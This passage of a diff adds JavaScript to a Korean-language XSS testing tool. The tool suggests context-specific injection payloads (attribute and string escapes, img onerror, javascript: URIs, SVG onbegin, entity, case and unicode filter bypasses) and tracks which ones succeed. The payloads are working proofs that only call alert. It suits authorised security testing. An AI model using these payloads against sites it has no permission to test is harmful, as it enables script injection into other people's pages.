+    if (!cBad("'")) pl.push({ id: 'adq5', tier: 2, label: '작은따옴표 대체 탈출', p: "' onmouseover='alert(1)", desc: '"가 차단될 때 \' 시도.', fail: '' });
+    pl.push({ id: 'adq6', tier: 2, label: '따옴표 없이 이벤트 삽입 (unquoted)', p: ' onmouseover=alert(1) x=', desc: '속성이 unquoted일 때 공백으로 새 속성 추가.', fail: '' });
+    pl.push({ id: 'adq7', tier: 3, label: 'HTML 엔티티 인코딩 우회', p: '&quot; onmouseover=&quot;alert(1)', desc: '일부 프레임워크가 &quot;를 "로 변환 후 파싱.', fail: '' });
+  } else if (ctx === 'html_attr_sq') {
+    if (!cBad("'")) {
+      pl.push({ id: 'asq1', tier: 1, label: '작은따옴표 탈출 + 이벤트 삽입', p: "' onmouseover='alert(1)", desc: "'로 속성 탈출 후 이벤트 삽입.", fail: '' });
+      if (angleOk()) pl.push({ id: 'asq2', tier: 1, label: '태그 탈출 후 img onerror', p: "'><img src=x onerror=alert(1)>", desc: "속성 탈출 + 태그 탈출.", fail: '' });
+    }
+    pl.push({ id: 'asq3', tier: 2, label: '따옴표 없이 이벤트 삽입', p: ' onmouseover=alert(1) x=', desc: '공백으로 새 속성을 추가.', fail: '' });
+  } else if (ctx === 'html_attr_nq') {
+    pl.push({ id: 'anq1', tier: 1, label: '공백으로 새 속성 추가', p: ' onmouseover=alert(1) ', desc: '따옴표 없는 속성에 공백으로 이벤트 핸들러 추가.', fail: '' });
+    if (angleOk()) pl.push({ id: 'anq2', tier: 1, label: '태그 닫기 + 스크립트', p: '><script>alert(1)</script><x ', desc: '>로 태그를 닫고 script 삽입.', fail: '' });
+  } else if (ctx === 'js_sq') {
+    if (!cBad("'")) {
+      pl.push({ id: 'jssq1', tier: 1, label: "작은따옴표 탈출 (산술)", p: "'-alert(document.domain)-'", desc: "산술 연산자로 탈출해 alert 실행.", fail: '' });
+      pl.push({ id: 'jssq2', tier: 1, label: "작은따옴표 탈출 + 주석", p: "'; alert(document.domain);//", desc: "세미콜론으로 문장 종료 후 alert 삽입.", fail: '' });
+    }
+    if (!cBad('\\')) pl.push({ id: 'jssq3', tier: 2, label: '백슬래시 이스케이프 무력화', p: "\\'; alert(document.domain);//", desc: "서버가 \\' 앞에 \\ 추가 시 \\\\' 가 되어 탈출.", fail: '' });
+    pl.push({ id: 'jssq4', tier: 3, label: 'Unicode 이스케이프 우회', p: "\\u0027;alert(1);//", desc: "\\u0027 = ' 유니코드. 일부 환경에서 파싱 우회.", fail: '' });
+  } else if (ctx === 'js_dq') {
+    if (!cBad('"')) {
+      pl.push({ id: 'jsdq1', tier: 1, label: '큰따옴표 탈출 (산술)', p: '"-alert(document.domain)-"', desc: '산술 연산자로 탈출.', fail: '' });
+      pl.push({ id: 'jsdq2', tier: 1, label: '큰따옴표 탈출 + 주석', p: '"; alert(document.domain);//', desc: '세미콜론 후 alert 삽입.', fail: '' });
+    }
+    pl.push({ id: 'jsdq3', tier: 3, label: 'Unicode 우회', p: '\\u0022;alert(1);//', desc: '\\u0022 = " 유니코드.', fail: '' });
+  } else if (ctx === 'js_tmpl') {
+    pl.push({ id: 'jstmpl1', tier: 1, label: '템플릿 표현식 삽입', p: '${alert(document.domain)}', desc: '${} 안에 JS 표현식을 삽입해 실행.', fail: '' });
+    pl.push({ id: 'jstmpl2', tier: 1, label: '백틱 탈출', p: '`-alert(document.domain)-`', desc: '백틱으로 템플릿 리터럴을 닫고 실행.', fail: '' });
+    pl.push({ id: 'jstmpl3', tier: 2, label: '중첩 템플릿 표현식', p: '${`${alert(document.domain)}`}', desc: '중첩 표현식으로 일부 필터 우회.', fail: '' });
+  } else if (ctx === 'url_href') {
+    if (eOk('jsURI')) {
+      pl.push({ id: 'url1', tier: 1, label: 'javascript: URI', p: 'javascript:alert(document.domain)', desc: 'href에 javascript: URI 삽입. 클릭 시 실행.', fail: 'javascript: 차단 시 → 아래 우회 기법' });
+      pl.push({ id: 'url2', tier: 2, label: '대소문자 우회', p: 'JaVaScRiPt:alert(1)', desc: 'JavaScript: 키워드 대소문자 변형.', fail: '' });
+      pl.push({ id: 'url3', tier: 2, label: 'HTML 엔티티 우회 (콜론)', p: 'javascript&#58;alert(1)', desc: '&#58; = :(콜론) HTML 엔티티.', fail: '' });
+      pl.push({ id: 'url4', tier: 2, label: '탭 문자 삽입 우회', p: 'java\tscript:alert(1)', desc: '탭 문자 삽입. 일부 파서가 무시하고 파싱.', fail: '' });
+      pl.push({ id: 'url5', tier: 2, label: '개행 문자 삽입 우회', p: 'java\nscript:alert(1)', desc: '개행 문자 삽입 우회.', fail: '' });
+    } else {
+      pl.push({ id: 'url6', tier: 2, label: 'data: URI', p: 'data:text/html,<svg onload=alert(1)>', desc: 'javascript: 차단 시 data: URI 시도.', fail: '' });
+    }
+  } else if (ctx === 'svg_body') {
+    pl.push({ id: 'svg1', tier: 1, label: 'SVG onload', p: '<svg onload=alert(1)>', desc: 'SVG 컨텍스트에서 직접 태그 삽입.', fail: '' });
+    pl.push({ id: 'svg2', tier: 1, label: 'SVG script 태그', p: '<script>alert(1)</script>', desc: 'SVG 컨텍스트에서 script 태그 허용 여부 확인.', fail: '' });
+    pl.push({ id: 'svg3', tier: 2, label: 'animateTransform onbegin', p: '<animateTransform onbegin=alert(1) attributeName=transform>', desc: 'SVG 애니메이션 시작 이벤트.', fail: '' });
+    pl.push({ id: 'svg4', tier: 2, label: 'set onbegin', p: '<set onbegin=alert(1) attributeName=x from=0 to=1>', desc: 'set 요소의 onbegin 이벤트.', fail: '' });
+  } else if (ctx === 'comment') {
+    pl.push({ id: 'cmt1', tier: 1, label: '주석 종료 후 태그 삽입', p: '--><script>alert(1)</script>', desc: '-->로 주석을 닫고 스크립트 삽입.', fail: '' });
+    if (angleOk()) pl.push({ id: 'cmt2', tier: 1, label: '주석 종료 후 img onerror', p: '--><img src=x onerror=alert(1)>', desc: '주석 탈출 후 이벤트 핸들러.', fail: '' });
+  }
+
+  S.payloads = pl.map(p => ({ ...p, status: 'pending' }));
+  renderPayloads();
+}
+
+function renderPayloads() {
+  const list = document.getElementById('plList');
+  if (!S.payloads.length) { list.innerHTML = '<p style="color:#8b95a1;font-size:13px">해당 컨텍스트에 대한 페이로드가 없습니다.</p>'; return; }
+  const tierLabel = { 1: '우선순위 높음', 2: '대체 페이로드', 3: '우회 기법' };
+  const tierCls = { 1: 't1', 2: 't2', 3: 't3' };
+  list.innerHTML = S.payloads.map(p => {
+    const cls = p.status === 'blocked' ? 'pc pc-blocked' : p.status === 'success' ? 'pc pc-success' : 'pc';
+    const pfx = p.status === 'success' ? '✅ ' : p.status === 'blocked' ? '❌ ' : '';
+    return `<div class="${cls}" id="pc-${p.id}">
+      <div class="pc-head">
+        <span class="pc-label">${pfx}${esc(p.label)}</span>
+        <span class="tier-badge ${tierCls[p.tier]||'t3'}">${tierLabel[p.tier]||'기타'}</span>
+      </div>
+      <div class="pc-code">${esc(p.p)}</div>
+      <div class="pc-desc">${esc(p.desc)}</div>
+      <div class="pc-actions">
+        <button class="btn btn-s btn-sm" onclick="copyPL('${p.id}')">📋 복사</button>
+        ${p.status === 'pending' ? `
+        <button class="btn btn-d btn-sm" onclick="markPL('${p.id}','blocked')">❌ 차단됨</button>
+        <button class="btn btn-ok btn-sm" onclick="markPL('${p.id}','success')">✅ 성공!</button>` : ''}
+      </div>
+      ${p.fail ? `<div class="pc-fail">💡 ${esc(p.fail)}</div>` : ''}
+    </div>`;
+  }).join('');
+  updateStats();
+}
+
+function copyPL(id) {
+  const p = S.payloads.find(x => x.id === id);
+  if (!p) return;
+  S.stats.tried++;
+  navigator.clipboard.writeText(p.p).then(() => toast('페이로드 복사됨'));
+  updateStats();
+}
+
+function markPL(id, status) {
+  const p = S.payloads.find(x => x.id === id);
+  if (!p) return;
+  p.status = status;
+  if (status === 'blocked') S.stats.blocked++;
+  if (status === 'success') { S.stats.success++; document.getElementById('successMsg').style.display = 'block'; }
+  S.stats.tried++;
+  renderPayloads();
+  updateFindings();
+}
+
+function updateStats() {
+  document.getElementById('st-tried').textContent = S.stats.tried;
+  document.getElementById('st-blocked').textContent = S.stats.blocked;
+  document.getElementById('st-success').textContent = S.stats.success;
+}
+
+// ── Findings ──
+function updateFindings() {
+  const list = document.getElementById('findingsList');
+  const rows = [];
+  const at = (k, v, cls) => rows.push({ k, v, cls: cls || '' });
+
+  if (S.arch.xssType) at('XSS 유형', { reflected: 'Reflected', stored: 'Stored', dom: 'DOM-based' }[S.arch.xssType], 'fp');
+  if (S.arch.inputSrc) at('입력 방식', { get: 'GET 파라미터', post: 'POST Body', header: 'HTTP 헤더', path: 'URL 경로' }[S.arch.inputSrc], 'fp');
+  if (S.step >= 2) at('센티넬', S.sentinel, '');
+
+  const probed = CHARS.filter(c => S.probe.chars[c] !== 'unknown');
+  if (probed.length) {
+    const pills = CHARS.map(c => {
+      const s = S.probe.chars[c];
+      if (s === 'unknown') return '';
+      const d = c === '<' ? '&lt;' : c === '>' ? '&gt;' : c === '"' ? '&quot;' : c === '&' ? '&amp;' : esc(c);
+      return `<span class="cpill ${s}">${d}</span>`;
+    }).join('');
+    rows.push({ k: '문자 결과', v: `<div class="char-pills">${pills}</div>`, raw: true });
+  }
+
+  EXTRAS.forEach(e => {
+    const s = S.probe.extras[e.key];
+    if (s && s !== 'unknown') {
+      const lbl = { pass: '✅ 통과', encoded: '⚠️ 변환', blocked: '❌ 차단' }[s];
+      at(e.label, lbl, s === 'blocked' ? 'fb' : s === 'pass' ? 'fp' : 'fe');
+    }
+  });
+
+  if (S.ctx) {
+    const c = CTXS.find(x => x.id === S.ctx);
+    at('컨텍스트', c ? c.name : S.ctx, 'fp');
+  }
+
+  if (S.stats.success > 0) at('결과', `성공 ${S.stats.success}개 확인`, 'fp');
+
+  if (!rows.length) { list.innerHTML = '<p style="font-size:12px;color:#8b95a1">단계를 진행하면 여기에 누적됩니다.</p>'; return; }
+  list.innerHTML = rows.map(r => `<div class="fi"><span class="fk">${esc(r.k)}</span><span class="fv ${r.cls}">${r.raw ? r.v : esc(r.v)}</span></div>`).join('');
+}
+
+function setHelp(n) {
+  document.getElementById('helpBox').innerHTML = `<p style="font-size:12.5px;color:#6b7684;line-height:1.6">${esc(HELP[n] || '')}</p>`;
+}
+
+// ── Utils ──
+function copySentinel(id) {
+  const t = document.getElementById(id).textContent;
+  navigator.clipboard.writeText(t).then(() => toast('복사됨'));
+}
+
+function esc(s) { return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+function toast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 1400);
+}
+
+function resetAll() {
+  Object.assign(S, { step: 1, sentinel: '', arch: { xssType: null, inputSrc: null }, probe: { chars: {}, extras: {} }, ctx: null, payloads: [], stats: { tried: 0, blocked: 0, success: 0 } });
+  document.querySelectorAll('.ro').forEach(r => r.classList.remove('sel'));
+  document.querySelectorAll('input[type=radio]').forEach(r => r.checked = false);
+  document.getElementById('successMsg').style.display = 'none';
+  document.getElementById('ctxHint').style.display = 'none';
+  init();
+  goStep(1);
+}
+
+init();
+</script>
+</body>
+</html>
